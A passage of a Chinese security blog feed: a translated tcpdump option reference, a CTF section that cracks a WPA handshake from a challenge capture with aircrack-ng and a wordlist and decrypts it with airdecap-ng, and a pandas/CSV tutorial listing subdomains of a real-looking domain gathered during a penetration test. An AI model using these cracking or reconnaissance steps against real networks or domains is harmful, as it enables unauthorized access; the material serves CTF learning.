 不启用进行包匹配时所用的优化代码. 当怀疑某些bug是由优化代码引起的, 此选项将很有用.</span><br><span class="line">-p  一般情况下, 把网络接口设置为非<span class="string">&#x27;混杂&#x27;</span>模式. 但必须注意 , 在特殊情况下此网络接口还是会以<span class="string">&#x27;混杂&#x27;</span>模式来工作； 从而, <span class="string">&#x27;-p&#x27;</span> 的设与不设,</span><br><span class="line">    不能当做以下选现的代名词:</span><br><span class="line">    <span class="string">&#x27;ether host &#123;local-hw-add&#125;&#x27;</span> 或  <span class="string">&#x27;ether broadcast&#x27;</span>(nt: 前者表示只匹配以太网地址为host 的包, 后者表示匹配以太网地址为广播地址的数据包).</span><br><span class="line">-q  快速(也许用&#x27;安静&#x27;更好?)打印输出. 即打印很少的协议相关信息, 从而输出行都比较简短.</span><br><span class="line">-R  设定tcpdump 对 ESP/AH 数据包的解析按照 RFC1825而不是RFC1829(nt: AH, 认证头, ESP， 安全负载封装,</span><br><span class="line">    这两者会用在IP包的安全传输机制中). 如果此选项被设置, tcpdump 将不会打印出<span class="string">&#x27;禁止中继&#x27;</span>域(nt: relay prevention field). 另外,</span><br><span class="line">     由于ESP/AH规范中没有规定ESP/AH数据包必须拥有协议版本号域,</span><br><span class="line">    所以tcpdump不能从收到的ESP/AH数据包中推导出协议版本号.</span><br><span class="line">-r  file</span><br><span class="line">    从文件file 中读取包数据. 如果file 字段为 <span class="string">&#x27;-&#x27;</span> 符号, 则tcpdump 会从标准输入中读取包数据.</span><br><span class="line">-S  打印TCP 数据包的顺序号时, 使用绝对的顺序号, 而不是相对的顺序号.(nt: 相对顺序号可理解为, 相对第一个TCP 包顺序号的差距,</span><br><span class="line">    比如, 接受方收到第一个数据包的绝对顺序号为<span class="number">232323</span>, 对于后来接收到的第<span class="number">2</span>个,第<span class="number">3</span>个数据包, tcpdump会打印其序列号为<span class="number">1</span>, <span class="number">2</span>分别</span><br><span class="line">    表示与第一个数据包的差距为<span class="number">1</span> 和 <span class="number">2.</span> 而如果此时-S 选项被设置, 对于后来接收到的第<span class="number">2</span>个, 第<span class="number">3</span>个数据包会打印出其绝对顺序号:</span><br><span class="line">    <span class="number">232324</span>, <span class="number">232325</span>).</span><br><span class="line">-s  snaplen</span><br><span class="line">    设置tcpdump的数据包抓取长度为snaplen, 如果不设置默认将会是<span class="number">68</span>字节(而支持网络接口分接头(nt: NIT, 上文已有描述,</span><br><span class="line">    可搜索<span class="string">&#x27;网络接口分接头&#x27;</span>关键字找到那里)的SunOS系列操作系统中默认的也是最小值是<span class="number">96</span>).</span><br><span class="line">    <span class="number">68</span>字节对于IP, ICMP(nt: Internet Control Message Protocol,</span><br><span class="line">    因特网控制报文协议), TCP 以及 UDP 协议的报文已足够, 但对于名称服务(nt: 可理解为dns, nis等服务), NFS服务相关的</span><br><span class="line">    数据包会产生包截短. 如果产生包截短这种情况, tcpdump的相应打印输出行中会出现<span class="string">&#x27;&#x27;</span>[|proto]<span class="string">&#x27;&#x27;</span>的标志（proto 实际会显示为</span><br><span class="line">    被截短的数据包的相关协议层次). 需要注意的是, 采用长的抓取长度(nt: snaplen比较大), 会增加包的处理时间, 并且会减少</span><br><span class="line">    tcpdump 可缓存的数据包的数量， 从而会导致数据包的丢失. 所以, 在能抓取我们想要的包的前提下, 抓取长度越小越好.</span><br><span class="line">    把snaplen 设置为<span class="number">0</span> 意味着让tcpdump自动选择合适的长度来抓取数据包.</span><br><span class="line">-T  type</span><br><span class="line">    强制tcpdump按type指定的协议所描述的包结构来分析收到的数据包.  目前已知的type 可取的协议为:</span><br><span class="line">    aodv (Ad-hoc On-demand Distance Vector protocol, 按需距离向量路由协议, 在Ad hoc(点对点模式)网络中使用),</span><br><span class="line">    cnfp (Cisco  NetFlow  protocol),  rpc(Remote Procedure Call), rtp (Real-Time Applications protocol),</span><br><span class="line">    rtcp (Real-Time Applications con-trol protocol), snmp (Simple Network Management Protocol),</span><br><span class="line">    tftp (Trivial File Transfer Protocol, 碎文件协议), vat (Visual Audio Tool, 可用于在internet 上进行电</span><br><span class="line">    视电话会议的应用层协议), 以及wb (distributed White Board, 可用于网络会议的应用层协议).</span><br><span class="line">-t     在每行输出中不打印时间戳</span><br><span class="line">-tt    不对每行输出的时间进行格式处理(nt: 这种格式一眼可能看不出其含义, 如时间戳打印成<span class="number">1261798315</span>)</span><br><span class="line">-ttt   tcpdump 输出时, 每两行打印之间会延迟一个段时间(以毫秒为单位)</span><br><span class="line">-tttt  在每行打印的时间戳之前添加日期的打印</span><br><span class="line">-u     打印出未加密的NFS 句柄(nt: handle可理解为NFS 中使用的文件句柄, 这将包括文件夹和文件夹中的文件)</span><br><span class="line">-U    使得当tcpdump在使用-w 选项时, 其文件写入与包的保存同步.(nt: 即, 当每个数据包被保存时, 它将及时被写入文件中,</span><br><span class="line">      而不是等文件的输出缓冲已满时才真正写入此文件)</span><br><span class="line">       -U 标志在老版本的libcap库(nt: tcpdump 所依赖的报文捕获库)上不起作用, 因为其中缺乏pcap_cump_flush()函数.</span><br><span class="line">-v    当分析和打印的时候, 产生详细的输出. 比如, 包的生存时间, 标识, 总长度以及IP包的一些选项. 这也会打开一些附加的包完整性</span><br><span class="line">      检测, 比如对IP或ICMP包头部的校验和.</span><br><span class="line">-vv   产生比-v更详细的输出. 比如, NFS回应包中的附加域将会被打印, SMB数据包也会被完全解码.</span><br><span class="line">-vvv  产生比-vv更详细的输出. 比如, telent 时所使用的SB, SE 选项将会被打印, 如果telnet同时使用的是图形界面,</span><br><span class="line">      其相应的图形选项将会以<span class="number">16</span>进制的方式打印出来(nt: telnet 的SB,SE选项含义未知, 另需补充).</span><br><span class="line">-w    把包数据直接写入文件而不进行分析和打印输出. 这些包数据可在随后通过-r 选项来重新读入并进行分析和打印.</span><br><span class="line">-W    filecount</span><br><span class="line">      此选项与-C 选项配合使用, 这将限制可打开的文件数目, 并且当文件数据超过这里设置的限制时, 依次循环替代之前的文件, 这相当</span><br><span class="line">      于一个拥有filecount 个文件的文件缓冲池. 同时, 该选项会使得每个文件名的开头会出现足够多并用来占位的<span class="number">0</span>, 这可以方便这些</span><br><span class="line">      文件被正确的排序.</span><br><span class="line">-x    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      总共打印的数据大小不会超过整个数据包的大小与snaplen 中的最小值. 必须要注意的是, 如果高层协议数据没有snaplen 这么长,</span><br><span class="line">      并且数据链路层(比如, Ethernet层)有填充数据, 则这些填充数据也会被打印.(nt: so <span class="keyword">for</span> link  layers  that</span><br><span class="line">      pad, 未能衔接理解和翻译, 需补充 )</span><br><span class="line">-xx   tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">-X    当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据(但不包括连接层的头部).</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-XX   当分析和打印时, tcpdump 会打印每个包的头部数据, 同时会以<span class="number">16</span>进制和ASCII码形式打印出每个包的数据, 其中包括数据链路层的头部.</span><br><span class="line">      这对于分析一些新协议的数据包很方便.</span><br><span class="line">-y    datalinktype</span><br><span class="line">      设置tcpdump 只捕获数据链路层协议类型是datalinktype的数据包</span><br><span class="line">-Z    user</span><br><span class="line">      使tcpdump 放弃自己的超级权限(如果以root用户启动tcpdump, tcpdump将会有超级用户权限), 并把当前tcpdump的</span><br><span class="line">      用户ID设置为user, 组ID设置为user首要所属组的ID(nt: tcpdump 此处可理解为tcpdump 运行之后对应的进程)</span><br><span class="line">      此选项也可在编译的时候被设置为默认打开.(nt: 此时user 的取值未知, 需补充)</span><br></pre></td></tr></table></figure><h2 id="Tcpdump常用命令实例"><a href="#Tcpdump常用命令实例" class="headerlink" title="Tcpdump常用命令实例"></a>Tcpdump常用命令实例</h2><ul><li>不可见的图层</li><li>Adobe的元数据格式‘XMP’</li><li>Adobe的XMP元数据</li><li>PDF的‘增量生成’功能允许保留用户不可见的前版本信息</li><li>白色的文字或背景图</li><li>图片背后的文字信息</li><li>图层后面被覆盖的另一个图层</li><li>不显示的注释层。</li></ul><h2 id="Wifi破解"><a href="#Wifi破解" class="headerlink" title="Wifi破解"></a>Wifi破解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng ctf.pcap -w /usr/share/wordlists/rockyou.txt</span><br><span class="line">airdecap-ng ctf.pcap -e ctf -p password1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng -w passwd.txt shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line">Choosing first network as target.</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">                               Aircrack-ng 1.6 </span><br><span class="line"></span><br><span class="line">      [00:00:00] 1&#x2F;1 keys tested (37.17 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: --</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 88888888 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : B4 30 38 0F 24 7B 57 AC DE B5 3A 7F 2E FE 6B 45 </span><br><span class="line">                       0B 34 02 C3 89 F9 69 D5 B7 35 87 1B FB 4C EE 7F </span><br><span class="line"></span><br><span class="line">      Transient Key  : 17 AE 23 D0 69 7C 0D 45 2B 40 F6 7D 06 C9 C5 6F </span><br><span class="line">                       25 F0 B0 48 7A 6C 22 7C E2 73 50 71 46 FE 5D 0C </span><br><span class="line">                       8F 59 01 BE 66 56 DF 1E 58 DD 34 DB BF A7 2D FD </span><br><span class="line">                       2C 53 11 7F B2 E5 F0 16 7F 57 F5 6A 04 36 F5 71 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 75 19 C5 F3 3E 33 58 23 CA 4B A1 85 FB 46 C0 2A </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ aircrack-ng &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line">#注意ESSID</span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  00:1D:0F:5D:D0:EE  0719                      WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;shipin.cap</span><br><span class="line">Read 16664 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line">Please specify a dictionary (option -w).</span><br></pre></td></tr></table></figure><p><code>-e</code>后面的为<code>ESSID</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~/桌面/steady$ airdecap-ng -e <span class="number">0719</span> -p <span class="number">88888888</span> shipin.cap</span><br><span class="line">Total number of stations seen            <span class="number">6</span></span><br><span class="line">Total number of packets read         <span class="number">16664</span></span><br><span class="line">Total number of WEP data packets         <span class="number">0</span></span><br><span class="line">Total number of WPA data packets        <span class="number">27</span></span><br><span class="line">Number of plaintext data packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of corrupted WEP  packets         <span class="number">0</span></span><br><span class="line">Number of decrypted WPA  packets        <span class="number">16</span></span><br><span class="line">Number of bad TKIP (WPA) packets         <span class="number">0</span></span><br><span class="line">Number of bad CCMP (WPA) packets         <span class="number">0</span></span><br></pre></td></tr></table></figure><p>之后会解出来一个压缩包。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Wireshark&quot;&gt;&lt;a href=&quot;#Wireshark&quot; class=&quot;headerlink&quot; title=&quot;Wireshark&quot;&gt;&lt;/a&gt;Wireshark&lt;/h1&gt;&lt;h2 id=&quot;文件导出功能&quot;&gt;&lt;a href=&quot;#文件导出功能&quot; class=&quot;head</summary>
      
    
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/categories/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CTF-流量分析" scheme="http://s1eady.top/tags/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--渗透测试小脚本</title>
    <link href="http://s1eady.top/2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    <id>http://s1eady.top/2020/11/11/Python%E5%AD%A6%E4%B9%A0--%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B0%8F%E8%84%9A%E6%9C%AC/</id>
    <published>2020-11-11T12:10:12.000Z</published>
    <updated>2020-11-10T02:27:00.774Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Python处理excel文档"><a href="#Python处理excel文档" class="headerlink" title="Python处理excel文档"></a>Python处理excel文档</h4><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200706131219279.png" alt="image-20200706131219279"></p><h5 id="pd-read-excel"><a href="#pd-read-excel" class="headerlink" title="pd.read_excel"></a>pd.read_excel</h5><h6 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">     id                                url  ... elapsed  count</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...     0.2      1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...     2.5      2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...     2.5      2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...     2.6      3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...     2.6      3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...     2.6      3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...     2.6      3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...     9.4      4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...     9.4      4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...     9.4      4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...    None      1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...    None      1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...    None      2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...    None      2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...    None      4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...    None      5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...    None      5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...    None      7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...    None      7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...    None     13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...    None     13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...    None     16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...    None     16</span><br></pre></td></tr></table></figure><h6 id="name-指定列名"><a href="#name-指定列名" class="headerlink" title="name:指定列名"></a>name:指定列名</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">值为list或者str，默认None，一般使用list传参&lt;br&gt;</span><br><span class="line">指定表头的名称，list内的值跟表的列数要一一对应，即不能多也不能少，多或者少都会抛出ValueError错误: Number of passed names did not match number of header fields in the file</span><br><span class="line">使用str类型传参时会循环出每一个字符在赋值给每一个表头，即不能多也不能少，多或者少都会抛出ValueError错误。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import pandas as pd</span><br><span class="line"></span><br><span class="line">content_list &#x3D; pd.read_excel(&quot;.&#x2F;52mf.com.xlsx&quot;,names&#x3D;&quot;abcdefghijklmn&quot;)</span><br><span class="line">print(content_list)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python3.7 &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;code&#x2F;python&#x2F;数据处理&#x2F;获取子域名的url</span><br><span class="line">      a                                  b  ...     m   n</span><br><span class="line">0     9                 http:&#x2F;&#x2F;52mf.com:80  ...   0.2   1</span><br><span class="line">1    43            http:&#x2F;&#x2F;mail.52mf.com:80  ...   2.5   2</span><br><span class="line">2    51          https:&#x2F;&#x2F;mail.52mf.com:443  ...   2.5   2</span><br><span class="line">3    60      http:&#x2F;&#x2F;renter-api.52mf.com:80  ...   2.6   3</span><br><span class="line">4    68    https:&#x2F;&#x2F;renter-api.52mf.com:443  ...   2.6   3</span><br><span class="line">5    77             http:&#x2F;&#x2F;www.52mf.com:80  ...   2.6   3</span><br><span class="line">6    85           https:&#x2F;&#x2F;www.52mf.com:443  ...   2.6   3</span><br><span class="line">7    94               http:&#x2F;&#x2F;m.52mf.com:80  ...   9.4   4</span><br><span class="line">8   102             https:&#x2F;&#x2F;m.52mf.com:443  ...   9.4   4</span><br><span class="line">9   111              http:&#x2F;&#x2F;oa.52mf.com:80  ...   9.4   4</span><br><span class="line">10  145             http:&#x2F;&#x2F;vpn.52mf.com:80  ...  None   1</span><br><span class="line">11  153           https:&#x2F;&#x2F;vpn.52mf.com:443  ...  None   1</span><br><span class="line">12  162            http:&#x2F;&#x2F;smtp.52mf.com:80  ...  None   2</span><br><span class="line">13  170          https:&#x2F;&#x2F;smtp.52mf.com:443  ...  None   2</span><br><span class="line">14  179        http:&#x2F;&#x2F;provider.52mf.com:80  ...  None   4</span><br><span class="line">15  196             http:&#x2F;&#x2F;pop.52mf.com:80  ...  None   5</span><br><span class="line">16  204           https:&#x2F;&#x2F;pop.52mf.com:443  ...  None   5</span><br><span class="line">17  230            http:&#x2F;&#x2F;imap.52mf.com:80  ...  None   7</span><br><span class="line">18  238          https:&#x2F;&#x2F;imap.52mf.com:443  ...  None   7</span><br><span class="line">19  281               http:&#x2F;&#x2F;s.52mf.com:80  ...  None  13</span><br><span class="line">20  289             https:&#x2F;&#x2F;s.52mf.com:443  ...  None  13</span><br><span class="line">21  315    http:&#x2F;&#x2F;autodiscover.52mf.com:80  ...  None  16</span><br><span class="line">22  323  https:&#x2F;&#x2F;autodiscover.52mf.com:443  ...  None  16</span><br></pre></td></tr></table></figure><h6 id="usecols"><a href="#usecols" class="headerlink" title="usecols"></a>usecols</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">值为None、int、str、list类型，指定读取表格的指定列</span><br><span class="line"> </span><br><span class="line">None时，读取整个excel列</span><br><span class="line">int时，读取从第一列开始到该数值（包含）结束的中间所有列</span><br><span class="line">str时，只能按照excel的格式指定列，如&quot;A: G&quot;，读取A列到G列的所有列</span><br><span class="line">list时，list的元素只能是int型，如：[1, 4],表示读取list内指定的第一和第四列</span><br></pre></td></tr></table></figure><h5 id="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"><a href="#案例–渗透中扫描到子域名存入xlsx文件并提取子域名" class="headerlink" title="案例–渗透中扫描到子域名存入xlsx文件并提取子域名"></a>案例–渗透中扫描到子域名存入xlsx文件并提取子域名</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">content_list = pd.read_excel(<span class="string">&quot;./52mf.com.xlsx&quot;</span>,usecols=[<span class="number">2</span>,<span class="number">5</span>],names=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">contents_list = content_list.values.tolist()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;./mofang_url.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    <span class="keyword">for</span> list <span class="keyword">in</span> contents_list:</span><br><span class="line">        print(list[<span class="number">0</span>])</span><br><span class="line">        fp.write(list[<span class="number">0</span>]+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Python处理cvs文档"><a href="#Python处理cvs文档" class="headerlink" title="Python处理cvs文档"></a>Python处理cvs文档</h4><h5 id="CSV文件的写入"><a href="#CSV文件的写入" class="headerlink" title="CSV文件的写入"></a>CSV文件的写入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以写入方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用writer方法，传入csv文件对象，得到的结果是一个CSVWriter对象</span></span><br><span class="line">writer = csv.writer(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用CSVWriter对象的writerow方法，一行行的写入数据</span></span><br><span class="line">writer.writerow([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;score&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以调用writerows方法，一次性写入多行数据</span></span><br><span class="line">writer.writerows([[<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;98&#x27;</span>],[<span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;99&#x27;</span>], [<span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;17&#x27;</span>, <span class="string">&#x27;90&#x27;</span>], [<span class="string">&#x27;jerry&#x27;</span>, <span class="string">&#x27;19&#x27;</span>, <span class="string">&#x27;95&#x27;</span>]])</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h5 id="CSV文件的读取"><a href="#CSV文件的读取" class="headerlink" title="CSV文件的读取"></a>CSV文件的读取</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以读取方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用csv模块的reader方法，得到的结果是一个可迭代对象</span></span><br><span class="line">reader = csv.reader(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对结果进行遍历，获取到结果里的每一行数据</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">    print(row)</span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Python处理excel文档&quot;&gt;&lt;a href=&quot;#Python处理excel文档&quot; class=&quot;headerlink&quot; title=&quot;Python处理excel文档&quot;&gt;&lt;/a&gt;Python处理excel文档&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>CTF-杂项手册</title>
    <link href="http://s1eady.top/2020/11/10/CTF-%E6%9D%82%E9%A1%B9%E6%89%8B%E5%86%8C/"/>
    <id>http://s1eady.top/2020/11/10/CTF-%E6%9D%82%E9%A1%B9%E6%89%8B%E5%86%8C/</id>
    <published>2020-11-10T14:14:20.000Z</published>
    <updated>2020-11-06T11:29:57.190Z</updated>
    
